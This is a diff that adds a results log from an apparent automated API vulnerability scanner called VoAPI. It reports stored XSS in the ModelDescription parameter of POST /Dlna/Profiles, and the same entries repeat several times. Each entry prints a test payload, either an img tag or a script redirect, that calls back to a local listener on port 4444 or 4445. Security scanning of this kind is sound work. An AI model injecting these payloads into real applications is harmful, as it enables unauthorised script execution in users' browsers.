@@ -1,0 +1,78 @@
+-------- VoAPI Vul API --------
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: ModelDescription
+API Test Payload: <img src='http://127.0.0.1:4444/xss/Dlna/ProfilesVoAPIModelDescription'>
+
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: ModelDescription
+API Test Payload: <img src='http://127.0.0.1:4444/xss/Dlna/ProfilesVoAPIModelDescription'>
+
+-------- VoAPI Vul API --------
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: ModelDescription
+API Test Payload: <img src='https://127.0.0.1:4445/xss/Dlna/ProfilesVoAPIModelDescription'>
+
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: ModelDescription
+API Test Payload: <img src='https://127.0.0.1:4445/xss/Dlna/ProfilesVoAPIModelDescription'>
+
+-------- VoAPI Vul API --------
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: ModelDescription
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/Dlna/ProfilesVoAPIModelDescription'</script>
+
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: ModelDescription
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/Dlna/ProfilesVoAPIModelDescription'</script>
+
+-------- VoAPI Vul API --------
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: ModelDescription
+API Test Payload: <img src='http://127.0.0.1:4444/xss/Dlna/ProfilesVoAPIModelDescription'>
+
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: ModelDescription
+API Test Payload: <img src='http://127.0.0.1:4444/xss/Dlna/ProfilesVoAPIModelDescription'>
+
+-------- VoAPI Vul API --------
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: ModelDescription
+API Test Payload: <img src='https://127.0.0.1:4445/xss/Dlna/ProfilesVoAPIModelDescription'>
+
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: ModelDescription
+API Test Payload: <img src='https://127.0.0.1:4445/xss/Dlna/ProfilesVoAPIModelDescription'>
+
+-------- VoAPI Vul API --------
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: ModelDescription
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/Dlna/ProfilesVoAPIModelDescription'</script>
+
+API Vul Type: xss
+Vul API Url: /Dlna/Profiles
+Vul API Method: Post
+API Vul Param: ModelDescription
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/Dlna/ProfilesVoAPIModelDescription'</script>
+
